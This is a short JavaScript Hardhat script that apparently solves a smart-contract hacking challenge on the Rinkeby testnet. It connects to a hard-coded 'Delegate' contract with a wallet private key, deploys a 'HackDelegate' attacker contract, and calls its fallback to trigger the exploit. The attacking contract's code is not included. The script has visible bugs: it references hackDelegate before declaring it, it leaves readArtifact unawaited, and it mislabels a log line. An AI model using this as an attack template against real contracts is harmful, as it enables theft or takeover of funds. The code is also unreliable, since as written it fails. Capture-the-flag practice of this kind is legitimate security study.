require("dotenv").config();
const delegateAbi = hre.artifacts.readArtifact("Delegate")
const provider = new hre.ethers.providers.JsonRpcProvider( process.env.RINKEBY_URL );
const wallet = new hre.ethers.Wallet( process.env.PRIVATE_KEY, provider );

const main = async () => {
  const delegateContract = await new hre.ethers.Contract("0xF221B392AB7F89D32b941fFdE6b3Ea271AA30587", delegateAbi.abi, wallet);
  console.log("Delegate contract: " + hackDelegate.address);

  const hackDelegateFactory = await hre.ethers.getContractFactory("HackDelegate"),
  hackDelegate = await hackDelegateFactory.deploy("0x023e90580fCda1c544C7D710c34fb9630041fEd9");
  await hackDelegate.deployed();
  console.log("Contract deployed to: " + hackDelegate.address);

  let txn = await hackDelegate.fallback(hackDelegate.address, "300")
  await txn.wait();
  console.log("Transfer function complete.");
}

const runMain = async () => {
  try {
    await main();
    process.exit(0);
  } catch (error) {
    console.log(error);
    process.exit(1);
  }
};

runMain();
